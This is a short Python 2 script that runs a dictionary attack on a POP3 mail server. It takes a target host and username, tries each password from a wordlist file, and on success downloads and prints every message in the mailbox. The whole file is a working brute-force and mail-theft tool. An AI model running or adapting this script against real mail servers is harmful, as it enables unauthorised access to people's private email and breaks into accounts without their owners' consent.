#!/usr/bin/env python
# popolupo.py - check for popz
#
# 07.03.2019@17:46
# based on: https://docs.python.org/3/library/poplib.html
#
import poplib
import sys

target = sys.argv[1]
user = sys.argv[2]

pwdfile = open('pwds_only.txt','r')
pwds = pwdfile.readlines()

for pwd in pwds:

  print 'checking user %s with pass %s' % ( user, pwd )
  try:
    # target mbox
    mbox = poplib.POP3(target, '110')
    mbox.user(user)
    pwd = pwd.rstrip('\n')
    mbox.pass_(pwd)

    count_msgs = len(mbox.list()[1])

    for i in range(count_msgs):
      for msg in mbox.retr(i+1)[1]:
        print 'retrived msg:', msg

    mbox.quit()
    pwdfile.close()

  except poplib.error_proto as e:
    print '[-] auth failed :C'
    pass

print '\n--- [+] bye...'

